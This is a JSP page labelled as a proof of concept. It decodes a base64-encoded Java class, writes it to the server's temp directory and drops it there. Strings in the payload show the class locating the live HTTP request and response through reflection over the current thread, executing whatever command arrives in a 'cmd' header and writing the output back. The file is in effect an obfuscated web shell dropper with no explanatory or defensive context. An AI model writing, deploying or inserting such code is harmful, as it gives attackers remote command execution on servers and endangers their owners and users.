<%@ page import="sun.misc.BASE64Decoder" %>
<%@ page import="java.io.IOException" %>
<%@ page import="java.util.Arrays" %>
<%@ page import="sun.misc.BASE64Encoder" %>
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%
    try {
        String path;
        if (java.io.File.separator.equals("/")) {
            path = "/tmp/";
        } else {
            path = "c:/windows/temp/";
        }

        java.io.OutputStream os = new java.io.FileOutputStream(path + "PoC.class");
        String content = "yv66vgAAADQAqgcAAgEAA1BvQwcABAEAEGphdmEvbGFuZy9PYmplY3QBAAFoAQATTGphdmEvdXRpbC9IYXNoU2V0OwEACVNpZ25hdHVyZQEAJ0xqYXZhL3V0aWwvSGFzaFNldDxMamF2YS9sYW5nL09iamVjdDs+OwEAAXIBACdMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdDsBAAFwAQAoTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlc3BvbnNlOwEABjxpbml0PgEAAygpVgEABENvZGUKAAMAEQwADQAOCQABABMMAAkACgkAAQAVDAALAAwHABcBABFqYXZhL3V0aWwvSGFzaFNldAoAFgARCQABABoMAAUABgoAHAAeBwAdAQAQamF2YS9sYW5nL1RocmVhZAwAHwAgAQANY3VycmVudFRocmVhZAEAFCgpTGphdmEvbGFuZy9UaHJlYWQ7CgABACIMACMAJAEAAUYBABYoTGphdmEvbGFuZy9PYmplY3Q7SSlWAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEABUxQb0M7AQABaQEAFShMamF2YS9sYW5nL09iamVjdDspWgoAFgAsDAAtACoBAAhjb250YWlucwoAFgAvDAAwACoBAANhZGQBAANvYmoBABJMamF2YS9sYW5nL09iamVjdDsBAA1TdGFja01hcFRhYmxlCgABADUMACkAKgcANwEAJWphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlcXVlc3QKAAMAOQwAOgA7AQAIZ2V0Q2xhc3MBABMoKUxqYXZhL2xhbmcvQ2xhc3M7CgA9AD8HAD4BAA9qYXZhL2xhbmcvQ2xhc3MMAEAAQQEAEGlzQXNzaWduYWJsZUZyb20BABQoTGphdmEvbGFuZy9DbGFzczspWggAQwEAA2NtZAsANgBFDABGAEcBAAlnZXRIZWFkZXIBACYoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nOwgASQEAC2dldFJlc3BvbnNlCgA9AEsMAEwATQEACWdldE1ldGhvZAEAQChMamF2YS9sYW5nL1N0cmluZztbTGphdmEvbGFuZy9DbGFzczspTGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZDsKAE8AUQcAUAEAGGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZAwAUgBTAQAGaW52b2tlAQA5KExqYXZhL2xhbmcvT2JqZWN0O1tMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZy9PYmplY3Q7BwBVAQAmamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVzcG9uc2ULAFQAVwwAWABZAQAJZ2V0V3JpdGVyAQAXKClMamF2YS9pby9QcmludFdyaXRlcjsHAFsBABFqYXZhL3V0aWwvU2Nhbm5lcgoAXQBfBwBeAQARamF2YS9sYW5nL1J1bnRpbWUMAGAAYQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsKAF0AYwwAZABlAQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwoAZwBpBwBoAQARamF2YS9sYW5nL1Byb2Nlc3MMAGoAawEADmdldElucHV0U3RyZWFtAQAXKClMamF2YS9pby9JbnB1dFN0cmVhbTsKAFoAbQwADQBuAQAYKExqYXZhL2lvL0lucHV0U3RyZWFtOylWCABwAQACXEEKAFoAcgwAcwB0AQAMdXNlRGVsaW1pdGVyAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS91dGlsL1NjYW5uZXI7CgBaAHYMAHcAeAEABG5leHQBABQoKUxqYXZhL2xhbmcvU3RyaW5nOwoAegB8BwB7AQATamF2YS9pby9QcmludFdyaXRlcgwAfQB+AQAHcHJpbnRsbgEAFShMamF2YS9sYW5nL1N0cmluZzspVgoAegCADACBAA4BAAVmbHVzaAcAgwEAE2phdmEvbGFuZy9FeGNlcHRpb24BAAFvAQAFZGVwdGgBAAFJCgA9AIgMAIkAigEAEWdldERlY2xhcmVkRmllbGRzAQAcKClbTGphdmEvbGFuZy9yZWZsZWN0L0ZpZWxkOwoAjACOBwCNAQAXamF2YS9sYW5nL3JlZmxlY3QvRmllbGQMAI8AkAEADXNldEFjY2Vzc2libGUBAAQoWilWCgCMAJIMAJMAlAEAA2dldAEAJihMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZy9PYmplY3Q7CgA9AJYMAJcAmAEAB2lzQXJyYXkBAAMoKVoKAAEAmgwACwAkBwCcAQATW0xqYXZhL2xhbmcvT2JqZWN0OwoAPQCeDACfADsBAA1nZXRTdXBlcmNsYXNzAQAFc3RhcnQBAAFuAQARTGphdmEvbGFuZy9DbGFzczsBAA1kZWNsYXJlZEZpZWxkAQAZTGphdmEvbGFuZy9yZWZsZWN0L0ZpZWxkOwEAAXEHAKcBABpbTGphdmEvbGFuZy9yZWZsZWN0L0ZpZWxkOwEAClNvdXJjZUZpbGUBAAhQb0MuamF2YQAhAAEAAwAAAAMACAAFAAYAAQAHAAAAAgAIAAgACQAKAAAACAALAAwAAAAEAAEADQAOAAEADwAAAFwAAgABAAAAHiq3ABABswASAbMAFLsAFlm3ABizABm4ABsDuAAhsQAAAAIAJQAAABoABgAAAAwABAANAAgADgAMAA8AFgAQAB0AEQAmAAAADAABAAAAHgAnACgAAAAKACkAKgABAA8AAABWAAIAAQAAABoqxgANsgAZKrYAK5kABQSssgAZKrYALlcDrAAAAAMAJQAAAA4AAwAAABQAEAAWABgAFwAmAAAADAABAAAAGgAxADIAAAAzAAAABAACDgEACgALACQAAQAPAAABYAAGAAIAAAC/GxA0owAPsgASxgAKsgAUxgAEsSq4ADSaAKeyABLHAFESNiq2ADi2ADyZAEUqwAA2swASsgASEkK5AEQCAMcACgGzABKnACqyABK2ADgSSAO9AD22AEqyABIDvQADtgBOwABUswAUpwAIVwGzABKyABLGAEayABTGAECyABS5AFYBALsAWlm4AFyyABISQrkARAIAtgBitgBmtwBsEm+2AHG2AHW2AHmyABS5AFYBALYAf6cABFexKhsEYLgAIbEAAgBHAGYAaQCCAHoAsgC1AIIAAwAlAAAASgASAAAAGwASABwAEwAeABoAHwAsACAAMwAhAEAAIgBEACMARwAlAGYAJgBqACcAbgAsAHoALgCnAC8AsgAwALYAMgC3ADUAvgA3ACYAAAAWAAIAAAC/AIQAMgAAAAAAvwCFAIYAAQAzAAAAEwAJEgAzYQcAggT3AEYHAIIAAAYACgAjACQAAQAPAAABpgACAAwAAAB+KrYAOE0stgCHWToGvjYFAzYEpwBbGQYVBDJOLQS2AIsBOgctKrYAkToHGQe2ADi2AJWaAAwZBxu4AJmnAC8ZB8AAm1k6C742CgM2CacAExkLFQkyOggZCBu4AJmECQEVCRUKof/spwAEV4QEARUEFQWh/6QstgCdWU3H/4uxAAEAIwBmAGkAggADACUAAAA+AA8AAAA5AAUAOwAbADwAIAA9ACMAPwAqAEEANQBCADsAQwA+AEQAVgBFAFwARABmAEkAagA7AHQATAB9AE0AJgAAAD4ABgAAAH4AoAAyAAAAAAB+AIUAhgABAAUAeQChAKIAAgAbAE8AowCkAAMAIwBHAIQAMgAHAFYABgClADIACAAzAAAAhgAI/AAFBwA9/wAPAAcHAAMBBwA9AAEBBwCmAAD/ACgACAcAAwEHAD0HAIwBAQcApgcAAwAA/wAQAAwHAAMBBwA9BwCMAQEHAKYHAAMAAQEHAJsAAA//AAkACAcAAwEHAD0HAIwBAQcApgcAAwABBwCC/wAAAAcHAAMBBwA9AAEBBwCmAAACAAEAqAAAAAIAqQ==";
        byte[] bytes = java.util.Base64.getDecoder().decode(content);
        os.write(bytes);
        os.close();

    }catch (Exception e){
        e.printStackTrace();
    }
%>